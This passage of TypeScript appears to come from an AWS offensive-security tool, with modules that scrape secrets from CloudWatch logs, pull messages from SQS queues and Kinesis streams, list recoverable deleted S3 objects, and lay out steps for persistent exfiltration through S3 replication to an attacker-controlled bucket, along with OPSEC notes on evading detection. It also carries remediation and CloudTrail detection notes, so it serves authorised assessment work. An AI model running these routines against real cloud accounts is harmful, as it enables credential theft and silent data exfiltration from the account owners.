  if (logGroup) {
    groups.push(logGroup)
  } else {
    const r = await aws(
      ["logs", "describe-log-groups", "--query", "logGroups[].logGroupName"],
      profile,
      region,
      timeout,
    )
    if (r.exitCode !== 0) return { output: `[-] Cannot list log groups: ${r.stderr.trim()}`, findings }
    const all = tryJson(r.stdout) || []
    output.push(`[+] Log groups found: ${all.length}`)
    groups.push(...all.slice(0, maxGroups))
    if (all.length > maxGroups) output.push(`[*] Scanning first ${maxGroups} groups (use --max-groups N to change)\n`)
  }

  let totalSecrets = 0

  for (const g of groups) {
    output.push(`\n── ${g} ──`)

    const streams = await aws(
      [
        "logs",
        "describe-log-streams",
        "--log-group-name",
        g,
        "--order-by",
        "LastEventTime",
        "--descending",
        "--limit",
        "3",
        "--query",
        "logStreams[].logStreamName",
      ],
      profile,
      region,
      timeout,
    )
    if (streams.exitCode !== 0) {
      output.push(`    [-] Access denied`)
      continue
    }
    const streamNames = tryJson(streams.stdout) || []
    output.push(`    Streams (recent 3): ${streamNames.length}`)

    for (const s of streamNames) {
      const events = await aws(
        [
          "logs",
          "get-log-events",
          "--log-group-name",
          g,
          "--log-stream-name",
          s,
          "--limit",
          "100",
          "--query",
          "events[].message",
        ],
        profile,
        region,
        timeout,
      )
      if (events.exitCode !== 0) continue
      const messages = tryJson(events.stdout) || []

      for (const msg of messages) {
        if (typeof msg !== "string") continue
        if (secretPattern.test(msg)) {
          totalSecrets++
          const preview = msg.substring(0, 120).replace(/\n/g, " ")
          output.push(`    [!] Secret in ${s}: ${preview}...`)
          if (totalSecrets <= 20) {
            findings.push({
              checkId: "AWS-CWLOGS-001",
              provider: "aws",
              severity: "high",
              status: "EXTRACTED",
              resource: `${g}/${s}`,
              title: `Secret found in CloudWatch log`,
              details: `Log group: ${g}, stream: ${s} — ${preview}`,
              remediation: "Remove secrets from application logging, rotate exposed credentials",
            })
          }
        }
      }
    }
  }

  output.push(`\n[+] Total secrets found in logs: ${totalSecrets}`)
  if (totalSecrets > 20) output.push(`[*] Only first 20 reported as findings`)

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: DescribeLogGroups, DescribeLogStreams, GetLogEvents, FilterLogEvents`)
  output.push(`  Note: Bulk log retrieval across multiple groups is unusual — may trigger anomaly detection`)
  return { output: output.join("\n"), findings }
}

export async function snsSqsSiphon(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const targetTopic = argVal(args, "--topic")
  const targetQueue = argVal(args, "--queue")
  const findings: Finding[] = []
  const output: string[] = ["[*] SNS/SQS message interception...\n"]

  // Pre-flight: simulate SNS/SQS interception permissions
  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
  if (callerArn) {
    const actions = ["sqs:ReceiveMessage", "sns:Subscribe", "sns:ListSubscriptions", "sqs:GetQueueAttributes"]
    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
    const results = tryJson(sim.stdout)?.EvaluationResults || []
    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
    if (allowed.some((a: string) => a === "sns:Subscribe")) {
      output.push(`[!] sns:Subscribe ALLOWED — can add external subscription for persistent message siphon`)
      findings.push({ checkId: "AWS-EXFIL-SNS-001", provider: "aws", severity: "critical", status: "FAIL", resource: `iam://${callerArn}`, title: `SNS subscribe permitted — persistent message exfiltration possible`, details: `Can subscribe external endpoint to SNS topics for ongoing data capture`, remediation: "Restrict sns:Subscribe to specific topic ARNs and trusted endpoints" })
    }
    if (allowed.some((a: string) => a === "sqs:ReceiveMessage")) output.push(`[!] sqs:ReceiveMessage ALLOWED — can read queue messages`)
  }

  const sensitivePattern = /(?:password|secret|token|key|credential|ssn|credit.?card|account.?number|authorization)/i

  output.push("── SNS Topics ──")
  const topics = await aws(["sns", "list-topics", "--query", "Topics[].TopicArn"], profile, region, timeout)
  if (topics.exitCode === 0) {
    const topicArns = (tryJson(topics.stdout) || []) as string[]
    output.push(`[+] Topics: ${topicArns.length}`)

    const targets = targetTopic ? topicArns.filter((a) => a.includes(targetTopic)) : topicArns.slice(0, 10)

    for (const arn of targets) {
      const name = arn.split(":").pop() || arn
      const attrs = await aws(
        ["sns", "get-topic-attributes", "--topic-arn", arn, "--query", "Attributes"],
        profile,
        region,
        timeout,
      )
      if (attrs.exitCode !== 0) continue
      const a = tryJson(attrs.stdout)
      const policy = a?.Policy ? tryJson(a.Policy) : null

      output.push(`\n    ${name}:`)
      output.push(`      Subscriptions: ${a?.SubscriptionsConfirmed || 0}`)
      output.push(`      Encryption: ${a?.KmsMasterKeyId || "NONE"}`)

      if (policy) {
        for (const s of policy.Statement || []) {
          const principal = JSON.stringify(s.Principal || {})
          if (principal.includes("*") && s.Effect === "Allow") {
            output.push(`      [!] OPEN POLICY — anyone can publish/subscribe`)
            findings.push({
              checkId: "AWS-SNS-003",
              provider: "aws",
              severity: "high",
              status: "FAIL",
              resource: name,
              title: `SNS topic with wildcard principal: ${name}`,
              details: `Topic policy allows Principal: * — anyone can publish or subscribe`,
              remediation: "Restrict topic policy to specific accounts/services",
            })
          }
        }
      }

      const subs = await aws(
        [
          "sns",
          "list-subscriptions-by-topic",
          "--topic-arn",
          arn,
          "--query",
          "Subscriptions[].{Protocol:Protocol,Endpoint:Endpoint}",
        ],
        profile,
        region,
        timeout,
      )
      if (subs.exitCode === 0) {
        const subList = tryJson(subs.stdout) || []
        for (const sub of subList) output.push(`      → ${sub.Protocol}: ${sub.Endpoint}`)
      }
    }
  }

  output.push("\n── SQS Queues ──")
  const queues = await aws(["sqs", "list-queues", "--query", "QueueUrls"], profile, region, timeout)
  if (queues.exitCode === 0) {
    const queueUrls = (tryJson(queues.stdout) || []) as string[]
    output.push(`[+] Queues: ${queueUrls.length}`)

    const targets = targetQueue ? queueUrls.filter((u) => u.includes(targetQueue)) : queueUrls.slice(0, 5)

    for (const url of targets) {
      const name = url.split("/").pop() || url
      const attrs = await aws(
        ["sqs", "get-queue-attributes", "--queue-url", url, "--attribute-names", "All", "--query", "Attributes"],
        profile,
        region,
        timeout,
      )
      if (attrs.exitCode !== 0) continue
      const a = tryJson(attrs.stdout) || {}

      output.push(`\n    ${name}:`)
      output.push(`      Messages available: ${a.ApproximateNumberOfMessages || 0}`)
      output.push(`      Messages in flight: ${a.ApproximateNumberOfMessagesNotVisible || 0}`)
      output.push(`      Encryption: ${a.KmsMasterKeyId || "NONE"}`)

      const msgCount = parseInt(a.ApproximateNumberOfMessages || "0")
      if (msgCount > 0) {
        const recv = await aws(
          [
            "sqs",
            "receive-message",
            "--queue-url",
            url,
            "--max-number-of-messages",
            "10",
            "--wait-time-seconds",
            "3",
            "--query",
            "Messages",
          ],
          profile,
          region,
          timeout,
        )
        if (recv.exitCode === 0) {
          const messages = tryJson(recv.stdout) || []
          output.push(`      [+] Retrieved ${messages.length} message(s)`)
          for (const m of messages) {
            const body = typeof m.Body === "string" ? m.Body : JSON.stringify(m.Body || "")
            const preview = body.substring(0, 150)
            output.push(`        ${preview}${body.length > 150 ? "..." : ""}`)
            if (sensitivePattern.test(body)) {
              findings.push({
                checkId: "AWS-SQS-003",
                provider: "aws",
                severity: "high",
                status: "EXTRACTED",
                resource: name,
                title: `Sensitive data in SQS message: ${name}`,
                details: `Queue message contains sensitive content: ${preview}`,
                remediation: "Encrypt queue messages, avoid sending sensitive data in plaintext",
              })
            }
          }
        }
      }
    }
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: ReceiveMessage, Subscribe, ListTopics, ListQueues, GetTopicAttributes, GetQueueAttributes`)
  output.push(`  Note: SNS Subscribe to external HTTP/HTTPS endpoint is persistent exfil — survives credential rotation`)
  return { output: output.join("\n"), findings }
}

export async function kinesisTap(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const streamName = argVal(args, "--stream-name")
  const findings: Finding[] = []
  const output: string[] = ["[*] Kinesis stream tap...\n"]

  // Pre-flight: simulate Kinesis read permissions
  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
  if (callerArn) {
    const actions = ["kinesis:GetRecords", "kinesis:GetShardIterator", "kinesis:DescribeStream", "kinesis:ListStreams"]
    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
    const results = tryJson(sim.stdout)?.EvaluationResults || []
    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
    if (allowed.some((a: string) => a === "kinesis:GetRecords")) {
      output.push(`[!] kinesis:GetRecords ALLOWED — real-time stream data access possible`)
      findings.push({ checkId: "AWS-EXFIL-KINESIS-001", provider: "aws", severity: "critical", status: "FAIL", resource: `iam://${callerArn}`, title: `Kinesis stream read permitted — real-time data tap possible`, details: `Can read records from Kinesis data streams`, remediation: "Restrict kinesis:GetRecords and GetShardIterator to consumer applications only" })
    }
  }

  const r = await aws(["kinesis", "list-streams", "--query", "StreamNames"], profile, region, timeout)
  if (r.exitCode !== 0) return { output: `[-] Cannot list Kinesis streams: ${r.stderr.trim()}`, findings }
  const streams = (tryJson(r.stdout) || []) as string[]
  output.push(`[+] Kinesis streams: ${streams.length}`)

  const targets = streamName ? streams.filter((s) => s === streamName) : streams.slice(0, 5)
  if (streamName && targets.length === 0) return { output: `[-] Stream "${streamName}" not found`, findings }

  for (const name of targets) {
    const desc = await aws(
      ["kinesis", "describe-stream", "--stream-name", name, "--query", "StreamDescription"],
      profile,
      region,
      timeout,
    )
    if (desc.exitCode !== 0) {
      output.push(`\n[-] ${name}: access denied`)
      continue
    }
    const d = tryJson(desc.stdout)
    if (!d) continue

    const shardCount = d.Shards?.length || 0
    const encrypted = d.EncryptionType !== "NONE" && d.EncryptionType
    const retention = d.RetentionPeriodHours || 24

    output.push(`\n── ${name} ──`)
    output.push(`    Status: ${d.StreamStatus}`)
    output.push(`    Shards: ${shardCount}`)
    output.push(`    Retention: ${retention}h`)
    output.push(`    Encryption: ${encrypted || "NONE"}`)

    if (!encrypted) {
      findings.push({
        checkId: "AWS-KINESIS-001",
        provider: "aws",
        severity: "high",
        status: "FAIL",
        resource: name,
        title: `Kinesis stream without encryption: ${name}`,
        details: `Stream ${name} has no server-side encryption — data in transit/at rest is unprotected`,
        remediation: "Enable KMS encryption for the Kinesis stream",
      })
    }

    if (d.StreamStatus !== "ACTIVE" || shardCount === 0) continue

    const firstShard = d.Shards[0]?.ShardId
    if (!firstShard) continue

    const iter = await aws(
      [
        "kinesis",
        "get-shard-iterator",
        "--stream-name",
        name,
        "--shard-id",
        firstShard,
        "--shard-iterator-type",
        "LATEST",
      ],
      profile,
      region,
      timeout,
    )
    if (iter.exitCode !== 0) continue
    const iterData = tryJson(iter.stdout)
    if (!iterData?.ShardIterator) continue

    const records = await aws(
      ["kinesis", "get-records", "--shard-iterator", iterData.ShardIterator, "--limit", "10"],
      profile,
      region,
      timeout,
    )
    if (records.exitCode !== 0) continue
    const recs = tryJson(records.stdout)
    const recList = recs?.Records || []

    if (recList.length > 0) {
      output.push(`    [+] Retrieved ${recList.length} record(s) from shard ${firstShard}`)
      for (const rec of recList.slice(0, 5)) {
        const data = rec.Data ? Buffer.from(rec.Data, "base64").toString("utf-8") : ""
        const preview = data.substring(0, 120)
        output.push(`      ${preview}${data.length > 120 ? "..." : ""}`)
      }
    } else {
      output.push(`    [*] No records at LATEST position (stream may be idle)`)
    }
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: ListStreams, DescribeStream, GetShardIterator, GetRecords`)
  output.push(`  Note: Kinesis data stream access from non-consumer identity is high-signal — real-time data exposure`)
  return { output: output.join("\n"), findings }
}

export async function s3VersionRecovery(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const targetBucket = argVal(args, "--bucket")
  const findings: Finding[] = []
  const output: string[] = ["[*] S3 Versioning & Deleted Object Recovery\n"]

  // Pre-flight: simulate S3 version access
  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
  if (callerArn) {
    const actions = ["s3:ListBucketVersions", "s3:GetObjectVersion", "s3:DeleteObject"]
    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
    const results = tryJson(sim.stdout)?.EvaluationResults || []
    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
    if (allowed.length > 0) output.push(`[!] S3 version actions allowed: ${allowed.join(", ")}`)
  }

  const bucketsCmd = targetBucket
    ? null
    : await aws(["s3api", "list-buckets", "--query", "Buckets[].Name"], profile, region, timeout)
  const buckets = targetBucket
    ? [targetBucket]
    : bucketsCmd?.exitCode === 0
      ? ((tryJson(bucketsCmd.stdout) || []) as string[])
      : []

  if (buckets.length === 0) return { output: output.join("\n") + "\n[-] No buckets accessible", findings }
  output.push(`[+] Scanning ${buckets.length} bucket(s)\n`)

  let totalRecoverable = 0

  for (const bucket of buckets) {
    const ver = await aws(["s3api", "get-bucket-versioning", "--bucket", bucket], profile, region, timeout)
    if (ver.exitCode !== 0) {
      output.push(`[-] ${bucket}: access denied`)
      continue
    }
    const verStatus = tryJson(ver.stdout)
    const versioningEnabled = verStatus?.Status === "Enabled"
    const mfaDelete = verStatus?.MFADelete === "Enabled"

    if (!versioningEnabled) {
      output.push(`[·] ${bucket}: versioning disabled — skip`)
      continue
    }

    output.push(`── ${bucket} ──`)
    output.push(`    Versioning: ENABLED  MFA Delete: ${mfaDelete ? "ENABLED" : "DISABLED"}`)

    if (!mfaDelete) {
      findings.push({
        checkId: "AWS-EXFIL-S3MFA-001",
        provider: "aws",
        severity: "high",
        status: "FAIL",
        resource: `s3://${bucket}`,
        title: `S3 bucket ${bucket} has no MFA Delete protection`,
        details: "Versioning enabled but MFA Delete is off — attacker can permanently delete object versions without MFA",
        remediation: "Enable MFA Delete: aws s3api put-bucket-versioning --bucket BUCKET --versioning-configuration Status=Enabled,MFADelete=Enabled --mfa 'SERIAL CODE'",
      })
    }

    const deleteMarkers = await aws(
      [
        "s3api",
        "list-object-versions",
        "--bucket",
        bucket,
        "--query",
        "DeleteMarkers[].{Key:Key,VersionId:VersionId,LastModified:LastModified}",
        "--max-keys",
        "100",
      ],
      profile,
      region,
      timeout,
    )
    if (deleteMarkers.exitCode !== 0) {
      output.push(`    [-] Cannot list versions: ${deleteMarkers.stderr.trim().split("\n")[0]}`)
      continue
    }

    const markers = tryJson(deleteMarkers.stdout) || []
    if (markers.length === 0) {
      output.push(`    No deleted objects found`)
      continue
    }

    output.push(`    [!] Deleted objects recoverable: ${markers.length}`)
    totalRecoverable += markers.length

    const seen = new Set<string>()
    for (const m of markers.slice(0, 15)) {
      if (seen.has(m.Key)) continue
      seen.add(m.Key)
      output.push(`      ${m.Key} (deleted: ${m.LastModified})`)
    }
    if (markers.length > 15) output.push(`      ... and ${markers.length - 15} more`)

    output.push(`    Recovery: aws s3api delete-object --bucket ${bucket} --key KEY --version-id DELETE_MARKER_VERSION_ID`)

    findings.push({
      checkId: "AWS-EXFIL-S3VER-001",
      provider: "aws",
      severity: "medium",
      status: "FOUND",
      resource: `s3://${bucket}`,
      title: `${markers.length} recoverable deleted objects in ${bucket}`,
      details: `Versioned bucket has ${markers.length} delete markers — remove them to restore "deleted" files (e.g. ${markers[0]?.Key || "unknown"})`,
      remediation: "Permanently delete old versions if not needed, or enable lifecycle rules for noncurrent version expiration",
    })

    const oldVersions = await aws(
      [
        "s3api",
        "list-object-versions",
        "--bucket",
        bucket,
        "--query",
        "Versions[?IsLatest==`false`] | length(@)",
        "--max-keys",
        "200",
      ],
      profile,
      region,
      timeout,
    )
    if (oldVersions.exitCode === 0) {
      const count = tryJson(oldVersions.stdout) || 0
      if (count > 0) {
        output.push(`    [!] Non-current versions (old copies): ${count}`)
        output.push(`        Previous versions of overwritten files — may contain secrets from before rotation`)
      }
    }

    output.push("")
  }

  output.push(`[+] Total recoverable deleted objects across all buckets: ${totalRecoverable}`)

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: ListObjectVersions, GetBucketVersioning (per-bucket)`)
  output.push(`  CloudTrail: DeleteObject (version-specific delete to remove markers — looks like normal deletion)`)
  output.push(`  OPSEC: listing versions is low-signal alone, but bulk ListObjectVersions across many buckets is unusual`)
  output.push(`  OPSEC: removing delete markers (restoring files) leaves its own DeleteObject event — auditors may correlate version-specific deletes with no corresponding PutObject`)

  return { output: output.join("\n"), findings }
}

export async function s3ReplicationExfil(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const targetBucket = argVal(args, "--bucket")
  const findings: Finding[] = []
  const output: string[] = ["[*] S3 Replication Rule Audit & Exfil Assessment\n"]

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const identity = tryJson(id.stdout)
  const callerArn = identity?.Arn as string | undefined
  const ownAccount = identity?.Account as string | undefined

  const bucketsCmd = targetBucket
    ? null
    : await aws(["s3api", "list-buckets", "--query", "Buckets[].Name"], profile, region, timeout)
  const buckets = targetBucket
    ? [targetBucket]
    : bucketsCmd?.exitCode === 0
      ? ((tryJson(bucketsCmd.stdout) || []) as string[])
      : []

  if (buckets.length === 0) return { output: output.join("\n") + "\n[-] No buckets accessible", findings }
  output.push(`[+] Caller: ${callerArn}`)
  output.push(`[+] Scanning ${buckets.length} bucket(s)\n`)

  let canAddReplication = 0

  for (const bucket of buckets) {
    const repl = await aws(["s3api", "get-bucket-replication", "--bucket", bucket], profile, region, timeout)

    if (repl.exitCode === 0) {
      const config = tryJson(repl.stdout)?.ReplicationConfiguration
      const role = config?.Role as string | undefined
      const rules = (config?.Rules || []) as Array<Record<string, unknown>>

      output.push(`── ${bucket} ──`)
      output.push(`    Replication role: ${role || "N/A"}`)
      output.push(`    Rules: ${rules.length}`)

      for (const rule of rules) {
        const dest = rule.Destination as Record<string, unknown> | undefined
        const destBucket = dest?.Bucket as string | undefined
        const destAccount = dest?.Account as string | undefined
        const status = rule.Status as string | undefined
        const destName = destBucket?.split(":::")[1] || destBucket

        output.push(`      ${rule.ID || "unnamed"}: ${status}`)
        output.push(`        Destination: ${destName}${destAccount ? ` (account: ${destAccount})` : ""}`)

        if (destAccount && destAccount !== ownAccount) {
          output.push(`        [!] Cross-account replication to ${destAccount}`)
          findings.push({
            checkId: "AWS-EXFIL-S3REP-001",
            provider: "aws",
            severity: "high",
            status: "FOUND",
            resource: `s3://${bucket}`,
            title: `Cross-account S3 replication: ${bucket} → ${destName}`,
            details: `Bucket replicates to account ${destAccount} (${destName}) — data leaves this account automatically`,
            remediation: "Verify destination account is trusted; remove if unauthorized",
          })
        }

        const encConfig = dest?.EncryptionConfiguration as Record<string, unknown> | undefined
        if (!encConfig) {
          output.push(`        [!] No encryption in transit for replication`)
        }
      }
    } else {
      if (repl.stderr.includes("ReplicationConfigurationNotFoundError")) {
        // no replication — check if we can add one
      } else {
        continue
      }
    }

    if (callerArn) {
      const sim = await aws(
        [
          "iam",
          "simulate-principal-policy",
          "--policy-source-arn",
          callerArn,
          "--action-names",
          "s3:PutReplicationConfiguration",
          "--resource-arns",
          `arn:aws:s3:::${bucket}`,
          "--query",
          "EvaluationResults[0].EvalDecision",
        ],
        profile,
        region,
        timeout,
      )
      if (sim.exitCode === 0) {
        const decision = tryJson(sim.stdout) || sim.stdout.trim().replace(/"/g, "")
        if (decision === "allowed") {
          canAddReplication++
          output.push(`    [!] Current identity CAN add replication rules to ${bucket}`)
          output.push(`        Attack: add rule replicating to attacker-controlled bucket for persistent exfil`)
          findings.push({
            checkId: "AWS-EXFIL-S3REP-002",
            provider: "aws",
            severity: "critical",
            status: "FAIL",
            resource: `s3://${bucket}`,
            title: `Can add S3 replication to ${bucket} — persistent exfil possible`,
            details: `Current identity has s3:PutReplicationConfiguration on ${bucket} — can silently replicate all new objects to attacker bucket`,
            remediation: "Restrict s3:PutReplicationConfiguration to admin roles; monitor CloudTrail for PutBucketReplication events",
          })
        }
      }
    }
  }

  output.push(`\n[+] Buckets where replication can be added: ${canAddReplication}`)
  if (canAddReplication > 0) {
    output.push(`[*] Persistent exfil via replication:`)
    output.push(`    1. Create destination bucket in attacker account`)
    output.push(`    2. Create IAM role with s3:ReplicateObject trust`)
    output.push(`    3. aws s3api put-bucket-replication --bucket TARGET --replication-configuration ...`)
    output.push(`    4. All new objects auto-replicate — survives individual object cleanup`)
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: GetBucketReplication (read), PutBucketReplication (write — VERY high-signal)`)
  output.push(`  CloudTrail: ListBuckets, GetBucketVersioning (enumeration phase)`)
  output.push(`  GuardDuty: Policy:S3/BucketAnonymousAccessGranted, Exfiltration:S3/MaliciousIPCaller`)
  output.push(`  OPSEC: PutBucketReplication to cross-account destination is EXTREMELY high-signal`)
  output.push(`  OPSEC: replication is PERSISTENT — survives credential rotation, individual object deletion, even bucket policy changes unless the replication rule itself is removed`)
  output.push(`  OPSEC: data exfil via replication is silent to the data owner — no GetObject events, replicated objects appear in destination automatically`)

  return { output: output.join("\n"), findings }
}
